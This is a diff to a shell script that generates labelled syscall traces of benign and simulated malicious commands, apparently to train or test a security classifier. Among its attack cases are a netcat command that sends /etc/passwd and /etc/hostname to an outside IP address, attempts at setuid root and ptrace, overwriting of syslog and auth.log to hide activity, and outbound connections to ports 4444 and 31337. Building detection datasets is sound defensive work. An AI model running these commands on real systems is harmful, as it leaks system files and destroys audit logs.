@@ -42,7 +42,7 @@ write_label() {
   "trace": "${label}.log",
   "ground_truth": "${gt}",
   "technique": "${technique}",
-  "command": $(python3 -c "import json; print(json.dumps('''$cmd'''))"),
+  "command": $(CMD="$cmd" python3 -c 'import json,os; print(json.dumps(os.environ["CMD"]))'),
   "label_source": "researcher_at_capture_time",
   "capture_mode": "${source}",
   "label_rationale": "Label assigned from command intent before LLM classification"
@@ -116,12 +116,13 @@ run_trace "attack_T1068_setuid"   'bash -c "python3 -c \"import os; os.setuid(0)
 run_trace "attack_T1055_ptrace"   'bash -c "python3 -c \"import ctypes; ctypes.CDLL(None).ptrace(16, 1, 0, 0)\" 2>/dev/null || true"' "MALICIOUS" "T1055"
 run_trace "attack_T1041_exfil"    "bash -c 'cat /etc/passwd /etc/hostname > /tmp/data.txt; nc -w1 34.56.78.90 443 < /tmp/data.txt || true'" "MALICIOUS" "T1041"
 run_trace "attack_T1562_evasion"  'bash -c "echo x > /var/log/syslog 2>/dev/null || true"' "MALICIOUS" "T1562"
-run_trace "attack_T1078_valid_accts" "bash -c 'nc -l -p 2222 & sleep 0.2; nc -w1 -z 10.10.10.1 4444 || true; wait'" "MALICIOUS" "T1078"
+run_trace "attack_T1078_valid_accts" "bash -c 'timeout 2 nc -l -p 2222 >/dev/null 2>&1 & sleep 0.2; nc -w1 -z 10.10.10.1 4444 || true; wait 2>/dev/null || true'" "MALICIOUS" "T1078"
 
 # ── Expanded benign (43 more → 50 total) ─────────────────────────────────────
 echo ""
 echo "── Expanded benign ──"
 BENIGN_CMDS=(
+  # Basic shell / info — short, varied syscall mix
   "pwd"
   "id"
   "whoami"
@@ -130,41 +131,60 @@ BENIGN_CMDS=(
   "uname -a"
   "env | head -5"
   "df -h /"
-  "free -h 2>/dev/null || true"
   "uptime"
+  "locale"
+
+  # File / process inspection
   "wc -l /etc/passwd"
   "head -5 /etc/passwd"
-  "tail -5 /etc/passwd"
   "grep root /etc/passwd"
   "sort /etc/passwd | head -3"
   "cut -d: -f1 /etc/passwd | head -5"
   "ls -la /tmp | head -10"
-  "ls /etc | head -15"
   "file /bin/bash"
   "readlink -f /bin/sh"
+  "stat /bin/ls"
+  "find /etc -maxdepth 1 -type f | head -5"
+  "getent passwd | head -3"
+  "cat /etc/hosts"
+  "cat /proc/version"
+  "ls /proc/self/fd | head -5"
+
+  # Realistic system-admin workloads (systemd / journal / ps)
+  "ps auxf | head -10"
+  "ps -eo pid,ppid,comm | head -10"
+  "systemctl list-units --type=service --state=running 2>/dev/null | head -10 || true"
+  "systemctl status ollama 2>/dev/null | head -10 || true"
+  "journalctl -n 5 --no-pager 2>/dev/null || true"
+  "hostnamectl 2>/dev/null || true"
+  "timedatectl 2>/dev/null || true"
+  "loginctl 2>/dev/null | head -5 || true"
+
+  # Network introspection (no actual external traffic)
   "ss -tln 2>/dev/null || netstat -tln 2>/dev/null || true"
-  "ip route 2>/dev/null || true"
+  "ip -4 addr show 2>/dev/null | head -10 || true"
+  "ip route 2>/dev/null | head -5 || true"
   "ping -c 1 127.0.0.1"
+
+  # Package / runtime introspection
+  "dpkg -l 2>/dev/null | head -10 || true"
+  "apt-cache search bash 2>/dev/null | head -5 || true"
+
+  # Python runtime variety (different stdlib modules → different syscall sigs)
   "python3 -c 'import os; print(os.getcwd())'"
   "python3 -c 'import hashlib; print(hashlib.md5(b\"x\").hexdigest())'"
   "python3 -c 'import glob; print(len(glob.glob(\"/usr/bin/*\")))'"
   "python3 -c 'import subprocess; subprocess.run([\"ls\", \"-la\", \"/\"], check=False)'"
-  "cat /etc/hosts"
-  "cat /proc/version"
-  "ls /proc/self/fd | head -5"
+  "python3 -m json.tool <<< '{\"a\":1}'"
+
+  # Crypto / compression / archive (realistic dev workload)
+  "openssl rand -hex 16 2>/dev/null || true"
+  "openssl dgst -sha256 /etc/hosts 2>/dev/null || true"
+  "echo hello | gzip -c | gunzip -c"
+
+  # Editor / pager warmups
   "tr 'a-z' 'A-Z' <<< hello"
   "echo test | wc -c"
-  "du -sh /usr 2>/dev/null | head -1 || du -sh / 2>/dev/null | head -1"
-  "dpkg -l 2>/dev/null | head -5 || true"
-  "apt-get -qq update 2>/dev/null || true"
-  "curl -s --max-time 2 http://127.0.0.1:1/ || true"
-  "wget -q -O /dev/null --timeout=2 http://example.com 2>/dev/null || true"
-  "find /etc -maxdepth 1 -type f | head -5"
-  "stat /bin/ls"
-  "lsattr /etc/passwd 2>/dev/null || true"
-  "getent passwd | head -3"
-  "locale"
-  "python3 -m json.tool <<< '{\"a\":1}'"
 )
 
 i=1
@@ -187,7 +207,7 @@ for n in $(seq 1 42); do
     2) run_trace "$lbl" 'bash -c "python3 -c \"import os; os.setuid(0)\" 2>/dev/null; nc -w1 -z 185.${oct}.${n} 4444 || true"' "MALICIOUS" "T1068" ;;
     3) run_trace "$lbl" 'bash -c "python3 -c \"import ctypes; ctypes.CDLL(None).ptrace(16,0,0,0)\" 2>/dev/null || true"' "MALICIOUS" "T1055" ;;
     4) run_trace "$lbl" "bash -c 'echo x > /var/log/auth.log 2>/dev/null || true'" "MALICIOUS" "T1562" ;;
-    5) run_trace "$lbl" "bash -c 'nc -l -p $((8000+n)) & sleep 0.1; nc -w1 10.${oct}.${n}.5 8080 || true; wait'" "MALICIOUS" "T1078" ;;
+    5) run_trace "$lbl" "bash -c 'timeout 2 nc -l -p $((8000+n)) >/dev/null 2>&1 & sleep 0.1; nc -w1 10.${oct}.${n}.5 8080 || true; wait 2>/dev/null || true'" "MALICIOUS" "T1078" ;;
     6) run_trace "$lbl" "bash -c \"python3 -c \\\"import socket; s=socket.socket(); s.settimeout(1); s.connect(('10.0.${oct}.${n}', 31337))\\\" 2>/dev/null || true\"" "MALICIOUS" "T1059" ;;
   esac
 done
